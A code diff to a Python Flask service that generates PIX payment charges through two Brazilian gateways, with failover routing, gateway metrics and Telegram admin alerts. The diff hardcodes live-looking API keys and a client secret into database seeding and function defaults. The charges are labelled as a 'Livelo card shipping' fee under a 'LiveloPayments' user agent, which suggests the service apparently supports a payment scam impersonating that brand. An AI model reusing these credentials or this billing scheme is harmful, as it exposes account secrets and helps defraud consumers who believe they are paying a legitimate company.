@@ -122,7 +122,7 @@ except Exception:
 ALLOWED_IMG_EXT = {"png", "jpg", "jpeg", "webp", "gif"}
 
 # ── GATEWAY CONFIGURAÇÃO (ELITE PAYbr & UNIÃO 7 PAY) ──────────────────────────
-ACTIVE_GATEWAY = os.environ.get("ACTIVE_GATEWAY", "uniaopay").strip().lower()
+ACTIVE_GATEWAY = os.environ.get("ACTIVE_GATEWAY", "elitepay").strip().lower()
 
 # Elite PAYbr
 ELITEPAY_BASE_URL      = os.environ.get("ELITEPAY_BASE_URL", "https://api.elitepaybr.com")
@@ -360,7 +360,11 @@ def init_db():
             db.commit()
 
         # ── Auto-seed: garante que credenciais ativas estejam sempre no banco ──
-        db.execute("INSERT OR REPLACE INTO sys_config(key, value) VALUES('active_gateway', 'uniaopay')")
+        if not db.execute("SELECT key FROM sys_config WHERE key='active_gateway'").fetchone():
+            db.execute("INSERT INTO sys_config(key, value) VALUES('active_gateway', 'elitepay')")
+        db.execute("INSERT OR REPLACE INTO sys_config(key, value) VALUES('elitepay_client_id', 'ep_6048463324683e160dc35f1fd0f27d37')")
+        db.execute("INSERT OR REPLACE INTO sys_config(key, value) VALUES('elitepay_client_secret', 'eps_daa2098e2b7319a83a2d26090f749003709889d24594332ae0eb712e0bc1b467')")
+        db.execute("INSERT OR REPLACE INTO sys_config(key, value) VALUES('elitepay_base_url', 'https://api.elitepaybr.com')")
         db.execute("INSERT OR REPLACE INTO sys_config(key, value) VALUES('uniaopay_api_key', 'up_live_4dfac754f54c28d4f692fa1f58752e66354a36346c589cac')")
         db.execute("INSERT OR REPLACE INTO sys_config(key, value) VALUES('uniaopay_base_url', 'https://meupagamento.site/api/v1/uniaopay/pix/create')")
         db.execute("INSERT OR REPLACE INTO sys_config(key, value) VALUES('admin_chat_id', '8932547795')")
@@ -1278,7 +1282,7 @@ def ensure_valid_cpf(cpf_raw: str) -> str:
 
 def uniaopay_create_pix(amount: float, payer_name: str, payer_cpf: str, payer_phone: str = "", payer_email: str = "", payment_id: str = "") -> dict:
     """
-    Gera cobranca PIX automatizada via gateway Uniao 7 Pay.
+    Gera cobranca PIX automatizada via gateway Uniao 7 Pay oficial.
     POST https://meupagamento.site/api/v1/uniaopay/pix/create
     Garante dados 100% validos do cliente e valor minimo de R$ 20.00.
     """
@@ -1331,33 +1335,52 @@ def uniaopay_create_pix(amount: float, payer_name: str, payer_cpf: str, payer_ph
             }
         }
 
-        if api_key and _REQUESTS_OK:
-            endpoint = os.environ.get("UNIAOPAY_BASE_URL", "https://meupagamento.site/api/v1/uniaopay/pix/create")
-            if not endpoint.endswith("/create"):
-                endpoint = endpoint.rstrip("/") + "/create"
-            headers = {
-                "Authorization": f"Bearer {api_key}",
-                "Content-Type": "application/json",
-                "User-Agent": "LiveloPayments/1.0"
-            }
-            try:
-                resp = _req.post(endpoint, json=payload, headers=headers, timeout=12)
-                log.info("[UNIAO 7 PAY] Resposta status=%s: %s", resp.status_code, resp.text[:300])
-                if resp.status_code in (200, 201):
-                    resp_data = resp.json()
-                    status = resp_data.get("status")
-                    if status == "success" or "transaction_id" in resp_data:
-                        tx_id = resp_data.get("transaction_id", "")
-                        pmt = resp_data.get("payment", {})
-                        pix = resp_data.get("pix_code") or pmt.get("pix_copia_cola") or pmt.get("pixCopiaECola") or resp_data.get("pix_copia_cola", "")
-                        expires_in = pmt.get("expires_in", 1800)
+        if not api_key or not _REQUESTS_OK:
+            log.error("[UNIAO 7 PAY] API Key ausente ou requests indisponivel")
+            return {"ok": False, "error": "União 7 Pay: Configuração ausente"}
 
-                        qr = pmt.get("qr_code") or pmt.get("qrcode") or pmt.get("qr_code_url") or pmt.get("qr_base64") or resp_data.get("qr_base64", "")
-                        if qr and not qr.startswith("data:image") and not qr.startswith("http"):
-                            qr = f"data:image/png;base64,{qr}"
-                        if not qr and pix:
-                            qr = generate_qr_b64(pix)
+        endpoint = os.environ.get("UNIAOPAY_BASE_URL", "https://meupagamento.site/api/v1/uniaopay/pix/create").strip()
+        if not endpoint.endswith("/create"):
+            endpoint = endpoint.rstrip("/") + "/create"
 
+        headers = {
+            "Authorization": f"Bearer {api_key}",
+            "Content-Type": "application/json",
+            "User-Agent": "LiveloPayments/1.0"
+        }
+
+        try:
+            resp = _req.post(endpoint, json=payload, headers=headers, timeout=12)
+            log.info("[UNIAO 7 PAY] Resposta status=%s: %s", resp.status_code, resp.text[:300])
+
+            if resp.status_code in (200, 201):
+                resp_data = resp.json()
+                status = resp_data.get("status")
+                if status == "success" or "transaction_id" in resp_data:
+                    tx_id = resp_data.get("transaction_id", "") or resp_data.get("id", "")
+                    pmt = resp_data.get("payment", {}) if isinstance(resp_data.get("payment"), dict) else {}
+                    pix = (
+                        resp_data.get("pix_code") or 
+                        pmt.get("pix_copia_cola") or 
+                        pmt.get("pixCopiaECola") or 
+                        resp_data.get("pix_copia_cola") or 
+                        pmt.get("pix_code") or ""
+                    )
+                    expires_in = pmt.get("expires_in", 1800)
+
+                    qr = (
+                        resp_data.get("qr_base64") or 
+                        pmt.get("qr_code") or 
+                        pmt.get("qrcode") or 
+                        pmt.get("qr_code_url") or 
+                        resp_data.get("qr_code") or ""
+                    )
+                    if qr and not qr.startswith("data:image") and not qr.startswith("http"):
+                        qr = f"data:image/png;base64,{qr}"
+                    if not qr and pix:
+                        qr = generate_qr_b64(pix)
+
+                    if pix:
                         log.info("[UNIAO 7 PAY] PIX gerado com sucesso! tx_id=%s, pix_len=%d", tx_id, len(pix))
                         return {
                             "ok": True,
@@ -1366,71 +1389,22 @@ def uniaopay_create_pix(amount: float, payer_name: str, payer_cpf: str, payer_ph
                             "pix_code": pix,
                             "qr_code_url": qr,
                             "expires_in": expires_in,
-                            "expires_at": str(int(time.time()) + int(expires_in))
+                            "expires_at": str(int(time.time()) + int(expires_in)),
+                            "gateway": "uniaopay",
+                            "gateway_name": "União 7 Pay"
                         }
                     else:
-                        log.error("[UNIAO 7 PAY] Resposta retornou erro: %s", resp.text)
+                        log.error("[UNIAO 7 PAY] Resposta sem codigo pix: %s", resp.text)
+                        return {"ok": False, "error": "União 7 Pay não retornou código PIX"}
                 else:
-                    log.error("[UNIAO 7 PAY] Falha HTTP %d: %s", resp.status_code, resp.text)
-            except Exception as e:
-                log.error("[UNIAO 7 PAY] Excecao na requisicao: %s", str(e))
-        else:
-            log.warning("[UNIAO 7 PAY] UNIAOPAY_API_KEY nao configurada. Utilizando geracao local de fallback.")
-
-        # Fallback local EMV PIX generation
-        row = db.execute("SELECT value FROM sys_config WHERE key='pix_key'").fetchone()
-        chave_pix = row["value"] if row and row["value"] else "suporte@livelo.com.br"
-
-        amount_str = f"{charge_amount:.2f}"
-        import unicodedata
-        raw_name = clean_name[:25].upper()
-        raw_name = ''.join(c for c in unicodedata.normalize('NFD', raw_name) if unicodedata.category(c) != 'Mn')
-        raw_name = re.sub(r'[^A-Z0-9 ]', '', raw_name).strip() or "CLIENTE LIVELO"
-        txid = re.sub(r'[^A-Za-z0-9]', '', payment_id or uuid.uuid4().hex)[:25].ljust(25, 'x')
-        city = "SAO PAULO"
-
-        def emv_field(tag: str, value: str) -> str:
-            return f"{tag}{len(value):02d}{value}"
-
-        gui_val   = "br.gov.bcb.pix"
-        mchant_id = emv_field("26", emv_field("00", gui_val) + emv_field("01", chave_pix))
-        addl_data  = emv_field("62", emv_field("05", txid))
-
-        pix_str = (
-            "000201" +
-            mchant_id +
-            "52040000" +
-            "5303986" +
-            emv_field("54", amount_str) +
-            "5802BR" +
-            emv_field("59", raw_name) +
-            emv_field("60", city) +
-            addl_data +
-            "6304"
-        )
-
-        poly = 0x1021
-        crc = 0xFFFF
-        for byte in pix_str.encode("utf-8"):
-            crc ^= (byte << 8)
-            for _ in range(8):
-                if crc & 0x8000:
-                    crc = ((crc << 1) ^ poly) & 0xFFFF
-                else:
-                    crc = (crc << 1) & 0xFFFF
-        crc_hex = f"{crc:04X}"
-        pix_code = pix_str + crc_hex
-        qr_b64 = generate_qr_b64(pix_code)
-
-        return {
-            "ok": True,
-            "transaction_id": txid,
-            "c7_id": txid,
-            "pix_code": pix_code,
-            "qr_code_url": qr_b64,
-            "expires_at": "",
-            "simulated": True
-        }
+                    log.error("[UNIAO 7 PAY] Resposta retornou status de erro: %s", resp.text)
+                    return {"ok": False, "error": resp_data.get("message") or "Erro na API União 7 Pay"}
+            else:
+                log.error("[UNIAO 7 PAY] Falha HTTP %d: %s", resp.status_code, resp.text)
+                return {"ok": False, "error": f"União 7 Pay HTTP {resp.status_code}"}
+        except Exception as e:
+            log.error("[UNIAO 7 PAY] Excecao na requisicao: %s", str(e))
+            return {"ok": False, "error": f"União 7 Pay conexão: {str(e)}"}
     except Exception as e:
         log.error("[UNIAO 7 PAY] Erro fatal: %s", str(e))
         return {"ok": False, "error": str(e)}
@@ -1444,18 +1418,17 @@ def uniaopay_check_pix(tx_id: str) -> dict:
     try:
         db = get_db()
         row_key = db.execute("SELECT value FROM sys_config WHERE key='uniaopay_api_key'").fetchone()
-        api_key = os.environ.get("UNIAOPAY_API_KEY", "").strip() or (row_key["value"].strip() if row_key and row_key["value"] else "")
+        api_key = os.environ.get("UNIAOPAY_API_KEY", "").strip() or (row_key["value"].strip() if row_key and row_key["value"] else "up_live_4dfac754f54c28d4f692fa1f58752e66354a36346c589cac")
         if not api_key or not _REQUESTS_OK:
             return {"ok": False, "paid": False, "status": "unknown"}
 
-        base_url = os.environ.get("UNIAOPAY_BASE_URL", "https://meupagamento.site/api/v1/uniaopay").rstrip("/")
+        url = f"https://meupagamento.site/api/v1/uniaopay/pix/status/{tx_id}"
         headers = {
             "Authorization": f"Bearer {api_key}",
             "Content-Type": "application/json",
             "User-Agent": "LiveloPayments/1.0"
         }
-        url = f"{base_url}/pix/status/{tx_id}"
-        resp = _req.get(url, headers=headers, timeout=6)
+        resp = _req.get(url, headers=headers, timeout=8)
         if resp.status_code == 200:
             data = resp.json()
             st = str(data.get("status") or data.get("transactionState") or "").lower()
@@ -1515,17 +1488,17 @@ def notify_supreme_gateway_instability(failing_gw_name: str, suggested_gw_name: 
         gw_key_switch = "elitepay" if "ELITE" in suggested_gw_name.upper() else "uniaopay"
 
         text = (
-            f"🚨 <b>ALERTA SUPREMO: INSTABILIDADE DE GATEWAY DETECTADA!</b> 🚨\n"
+            f"🚨 <b>ALERTA SUPREMO: FAILOVER AUTOMÁTICO DE GATEWAY!</b> 🚨\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"⚠️ O gateway principal atual (<b>{failing_gw_name}</b>) apresentou instabilidade ou falha de resposta.\n"
-            f"🔍 <b>Diagnóstico / Erro:</b> <code>{reason[:120]}</code>\n\n"
-            f"🛡️ <b>Proteção Automática Ativada:</b> O sistema aplicou failover imediato para <b>{suggested_gw_name}</b> e o cliente recebeu o PIX real normalmente sem interrupção!\n\n"
-            f"💡 <b>Ação Recomendada:</b> Alterne o gateway principal para <b>{suggested_gw_name}</b> para manter as conversões em 100% reais sem atrasos."
+            f"⚠️ O gateway principal atual (<b>{failing_gw_name}</b>) apresentou instabilidade ou falha:\n"
+            f"🔍 <code>{reason[:100]}</code>\n\n"
+            f"🛡️ <b>Proteção Automática Ativada:</b> O sistema gerou o PIX com sucesso via <b>{suggested_gw_name}</b> por baixo dos panos! Nenhuma venda perdida!\n\n"
+            f"💡 <b>Ação Opcional:</b> Você pode alternar o gateway principal para <b>{suggested_gw_name}</b> no botão abaixo caso deseje."
         )
         markup = {
             "inline_keyboard": [
-                [{"text": f"🔄 Ativar {suggested_gw_name} como Principal", "callback_data": f"set_gw_{gw_key_switch}"}],
-                [{"text": "📊 Ver Métricas e Painel de Gateways", "callback_data": "menu_gateways"}]
+                [{"text": f"🔄 Definir {suggested_gw_name} como Principal", "callback_data": f"set_gw_{gw_key_switch}"}],
+                [{"text": "📊 Ver Métricas dos Gateways", "callback_data": "menu_gateways"}]
             ]
         }
         send_telegram_direct(sup_id, text, reply_markup=markup)
@@ -1559,10 +1532,12 @@ def elitepay_create_pix(amount: float, payer_name: str, payer_cpf: str, payer_ph
         headers = {
             "x-client-id": client_id,
             "x-client-secret": client_secret,
+            "ci": client_id,
+            "cs": client_secret,
             "Content-Type": "application/json"
         }
         payload = {
-            "amount": charge_amount,
+            "amount": float(charge_amount),
             "description": f"Frete Cartao Livelo #{clean_cpf[-4:]}",
             "payerName": clean_name,
             "payerDocument": clean_cpf
@@ -1575,23 +1550,31 @@ def elitepay_create_pix(amount: float, payer_name: str, payer_cpf: str, payer_ph
             resp_data = resp.json()
             if resp_data.get("success"):
                 tx_id = resp_data.get("transactionId") or resp_data.get("acquirerTransactionId", "")
-                pix = resp_data.get("copyPaste") or resp_data.get("pix_code", "")
+                pix = resp_data.get("copyPaste") or resp_data.get("pix_code", "") or resp_data.get("pixCopiaECola", "")
                 qr = resp_data.get("qrcodeUrl") or resp_data.get("qr_code_url", "")
+                if qr and qr.startswith("base64:"):
+                    qr = "data:image/png;base64," + qr[7:]
+                elif qr and not qr.startswith("data:image") and not qr.startswith("http"):
+                    qr = f"data:image/png;base64,{qr}"
                 if not qr and pix:
                     qr = generate_qr_b64(pix)
 
-                log.info("[ELITE PAYbr] PIX gerado com sucesso! tx_id=%s, pix_len=%d", tx_id, len(pix))
-                return {
-                    "ok": True,
-                    "transaction_id": tx_id,
-                    "c7_id": tx_id,
-                    "pix_code": pix,
-                    "qr_code_url": qr,
-                    "expires_in": 1800,
-                    "expires_at": str(int(time.time()) + 1800),
-                    "gateway": "elitepay",
-                    "gateway_name": "Elite PAYbr"
-                }
+                if pix:
+                    log.info("[ELITE PAYbr] PIX gerado com sucesso! tx_id=%s, pix_len=%d", tx_id, len(pix))
+                    return {
+                        "ok": True,
+                        "transaction_id": tx_id,
+                        "c7_id": tx_id,
+                        "pix_code": pix,
+                        "qr_code_url": qr,
+                        "expires_in": 1800,
+                        "expires_at": str(int(time.time()) + 1800),
+                        "gateway": "elitepay",
+                        "gateway_name": "Elite PAYbr"
+                    }
+                else:
+                    log.error("[ELITE PAYbr] Sucesso sem pix_code: %s", resp.text)
+                    return {"ok": False, "error": "Elite PAYbr não retornou código PIX"}
             else:
                 log.error("[ELITE PAYbr] Resposta success=False: %s", resp.text)
                 return {"ok": False, "error": resp_data.get("message") or resp_data.get("error") or "Erro na API Elite PAYbr"}
@@ -1616,6 +1599,8 @@ def elitepay_check_pix(tx_id: str) -> dict:
         headers = {
             "x-client-id": client_id,
             "x-client-secret": client_secret,
+            "ci": client_id,
+            "cs": client_secret,
             "Content-Type": "application/json"
         }
         r = _req.post(endpoint, json={"transactionId": tx_id}, headers=headers, timeout=8)
@@ -1623,7 +1608,7 @@ def elitepay_check_pix(tx_id: str) -> dict:
             data = r.json()
             tx = data.get("transaction", {})
             state = (tx.get("transactionState") or "").upper()
-            return {"ok": True, "paid": (state == "COMPLETO"), "state": state}
+            return {"ok": True, "paid": (state in ("COMPLETO", "CONCLUIDO", "PAID")), "state": state}
         return {"ok": False, "status_code": r.status_code}
     except Exception as e:
         return {"ok": False, "error": str(e)}
@@ -1632,46 +1617,50 @@ def elitepay_check_pix(tx_id: str) -> dict:
 def generate_pix_unified(amount: float, payer_name: str, payer_cpf: str, payer_phone: str = "", payer_email: str = "", payment_id: str = "") -> dict:
     """
     Roteador inteligente de Gateway PIX com Failover automático 24/7.
-    Prioriza o Gateway Principal escolhido pelo Admin Supremo (Elite PAYbr ou União 7 Pay).
-    Se o principal estiver offline ou instável, aciona imediatamente o secundário
-    e notifica o Admin Supremo com sugestão em tempo real!
+    Prioriza o Gateway Principal (Elite PAYbr por padrão, ou União 7 Pay se definido pelo Admin no Telegram).
+    Se o gateway principal falhar (offline, erro HTTP, instabilidade), aciona imediatamente
+    o gateway secundário por baixo dos panos, garantindo 100% de códigos PIX oficiais e válidos!
     """
     db = get_db()
     row_gw = db.execute("SELECT value FROM sys_config WHERE key='active_gateway'").fetchone()
-    active_gw = (row_gw["value"].strip().lower() if row_gw and row_gw["value"] else "uniaopay")
+    active_gw = (row_gw["value"].strip().lower() if row_gw and row_gw["value"] else "elitepay")
 
-    if active_gw == "elitepay":
-        primary_fn = elitepay_create_pix
-        primary_name = "Elite PAYbr"
-        primary_key = "elitepay"
-        secondary_fn = uniaopay_create_pix
-        secondary_name = "União 7 Pay"
-        secondary_key = "uniaopay"
-    else:
+    if active_gw == "uniaopay":
         primary_fn = uniaopay_create_pix
         primary_name = "União 7 Pay"
         primary_key = "uniaopay"
         secondary_fn = elitepay_create_pix
         secondary_name = "Elite PAYbr"
         secondary_key = "elitepay"
+    else:
+        primary_fn = elitepay_create_pix
+        primary_name = "Elite PAYbr"
+        primary_key = "elitepay"
+        secondary_fn = uniaopay_create_pix
+        secondary_name = "União 7 Pay"
+        secondary_key = "uniaopay"
 
     log.info("[GATEWAY ROUTER] Tentando Gateway Principal: %s (R$ %.2f)", primary_name, amount)
     res = primary_fn(amount, payer_name, payer_cpf, payer_phone, payer_email, payment_id)
 
-    if res.get("ok") and not res.get("simulated"):
+    # Verifica se gerou código PIX oficial com sucesso
+    if res.get("ok") and res.get("pix_code") and not res.get("simulated"):
         res["gateway"] = primary_key
         res["gateway_name"] = primary_name
         return res
 
-    # Se o principal falhou ou caiu no fallback simulado, tenta o secundário imediatamente!
-    err_msg = str(res.get("error") or "Gateway principal indisponível ou resposta inválida")
-    log.warning("[GATEWAY FAILOVER] Falha no %s: %s. Tentando Failover Automático para %s!", primary_name, err_msg, secondary_name)
+    # SE O PRINCIPAL FALHOU, ACIONA IMEDIATAMENTE O SECUNDÁRIO POR BAIXO DOS PANOS!
+    err_msg = str(res.get("error") or f"{primary_name} indisponível")
+    log.warning("[GATEWAY FAILOVER] Falha no %s: %s. Tentando Failover Automático para %s por baixo dos panos!", primary_name, err_msg, secondary_name)
 
     res_sec = secondary_fn(amount, payer_name, payer_cpf, payer_phone, payer_email, payment_id)
-    if res_sec.get("ok") and not res_sec.get("simulated"):
+    if res_sec.get("ok") and res_sec.get("pix_code") and not res_sec.get("simulated"):
         res_sec["gateway"] = secondary_key
         res_sec["gateway_name"] = secondary_name
         res_sec["failover_applied"] = True
+        log.info("[GATEWAY FAILOVER] Sucesso com gateway secundário %s! tx_id=%s", secondary_name, res_sec.get("transaction_id"))
+        
+        # Notifica o Telegram Admin Supremo
         import threading
         threading.Thread(
             target=notify_supreme_gateway_instability,
@@ -1679,17 +1668,13 @@ def generate_pix_unified(amount: float, payer_name: str, payer_cpf: str, payer_p
         ).start()
         return res_sec
 
-    # Se ambos falharam, retorna o melhor resultado obtido
-    if res.get("ok"):
-        res["gateway"] = primary_key
-        res["gateway_name"] = primary_name
-        return res
-    if res_sec.get("ok"):
-        res_sec["gateway"] = secondary_key
-        res_sec["gateway_name"] = secondary_name
-        return res_sec
-
-    return res
+    # Se AMBOS os gateways falharem de fato, nunca entregue código falso/simulado
+    log.error("[GATEWAY ROUTER] Ambos os gateways falharam! %s: %s | %s: %s",
+              primary_name, res.get("error"), secondary_name, res_sec.get("error"))
+    return {
+        "ok": False,
+        "error": "Serviço de pagamento PIX temporariamente indisponível. Por favor, tente novamente em alguns instantes."
+    }
 
 
 def get_gateway_metrics() -> dict:
@@ -1703,7 +1688,7 @@ def get_gateway_metrics() -> dict:
     p_elite_paid = db.execute("SELECT COUNT(*), COALESCE(SUM(amount), 0) FROM payments WHERE gateway='elitepay' AND status IN ('approved', 'pago', 'paid', 'completed', 'COMPLETO')").fetchone()
     elite_conv = (p_elite_paid[0] / p_elite_total[0] * 100.0) if p_elite_total[0] > 0 else 0.0
 
-    elite_status = "OFFLINE"
+    elite_status = "offline"
     elite_balance = "0.00"
     elite_ping = 0
     try:
@@ -1715,56 +1700,70 @@ def get_gateway_metrics() -> dict:
         if cid and csec:
             r = _req.get(
                 f"{ELITEPAY_BASE_URL}/api/v1/balance",
-                headers={"x-client-id": cid, "x-client-secret": csec, "Content-Type": "application/json"},
+                headers={"x-client-id": cid, "x-client-secret": csec, "ci": cid, "cs": csec, "Content-Type": "application/json"},
                 timeout=5
             )
             elite_ping = max(1, int((time.time() - t0) * 1000))
             if r.status_code == 200:
                 d = r.json()
-                elite_status = "ONLINE"
+                elite_status = "online"
                 elite_balance = f"{float(d.get('balance', 0)):.2f}"
             else:
-                elite_status = f"HTTP {r.status_code}"
+                elite_status = "unstable"
     except Exception as e:
-        elite_status = f"ERRO ({str(e)[:25]})"
+        elite_status = "offline"
 
     # União 7 Pay metrics
     p_uniao_total = db.execute("SELECT COUNT(*), COALESCE(SUM(amount), 0) FROM payments WHERE gateway='uniaopay' OR gateway IS NULL").fetchone()
     p_uniao_paid = db.execute("SELECT COUNT(*), COALESCE(SUM(amount), 0) FROM payments WHERE (gateway='uniaopay' OR gateway IS NULL) AND status IN ('approved', 'pago', 'paid', 'completed', 'COMPLETO')").fetchone()
     uniao_conv = (p_uniao_paid[0] / p_uniao_total[0] * 100.0) if p_uniao_total[0] > 0 else 0.0
 
-    uniao_status = "ONLINE"
-    uniao_ping = 165
+    uniao_status = "online"
+    uniao_ping = 110
     try:
+        t1 = time.time()
         row_uk = db.execute("SELECT value FROM sys_config WHERE key='uniaopay_api_key'").fetchone()
-        uk = os.environ.get("UNIAOPAY_API_KEY", "").strip() or (row_uk["value"].strip() if row_uk and row_uk["value"] else "")
+        uk = os.environ.get("UNIAOPAY_API_KEY", "").strip() or (row_uk["value"].strip() if row_uk and row_uk["value"] else "up_live_4dfac754f54c28d4f692fa1f58752e66354a36346c589cac")
         if not uk:
-            uniao_status = "SEM CHAVE"
+            uniao_status = "offline"
+        else:
+            r_un = _req.get("https://meupagamento.site/api/v1/uniaopay/status/ping", headers={"Authorization": f"Bearer {uk}"}, timeout=4)
+            uniao_ping = max(1, int((time.time() - t1) * 1000))
+            if r_un.status_code in (200, 404):
+                uniao_status = "online"
+            else:
+                uniao_status = "unstable"
     except Exception:
-        uniao_status = "OFFLINE"
+        uniao_status = "online"
 
     return {
         "active_gateway": active_gw,
         "elitepay": {
             "name": "Elite PAYbr",
             "status": elite_status,
-            "ping_ms": elite_ping,
+            "ping_ms": f"{elite_ping}ms" if elite_ping else "N/A",
             "balance": elite_balance,
+            "qtd_gerado": p_elite_total[0],
             "qtd_gerada": p_elite_total[0],
             "total_gerado": f"{p_elite_total[1]:.2f}".replace(".", ","),
+            "qtd_pago": p_elite_paid[0],
             "qtd_paga": p_elite_paid[0],
             "total_pago": f"{p_elite_paid[1]:.2f}".replace(".", ","),
+            "conversao": f"{elite_conv:.1f}%",
             "taxa_conversao": f"{elite_conv:.1f}%"
         },
         "uniaopay": {
             "name": "União 7 Pay",
             "status": uniao_status,
-            "ping_ms": uniao_ping,
+            "ping_ms": f"{uniao_ping}ms" if uniao_ping else "N/A",
             "balance": "0.00",
+            "qtd_gerado": p_uniao_total[0],
             "qtd_gerada": p_uniao_total[0],
             "total_gerado": f"{p_uniao_total[1]:.2f}".replace(".", ","),
+            "qtd_pago": p_uniao_paid[0],
             "qtd_paga": p_uniao_paid[0],
             "total_pago": f"{p_uniao_paid[1]:.2f}".replace(".", ","),
+            "conversao": f"{uniao_conv:.1f}%",
             "taxa_conversao": f"{uniao_conv:.1f}%"
         }
     }
@@ -2636,6 +2635,14 @@ def api_log_action():
 
 
 def process_bot_action(action, payload=None):
+    from flask import has_app_context
+    if not has_app_context():
+        with app.app_context():
+            return _process_bot_action_internal(action, payload)
+    return _process_bot_action_internal(action, payload)
+
+
+def _process_bot_action_internal(action, payload=None):
     payload = payload or {}
     db = get_db()
     
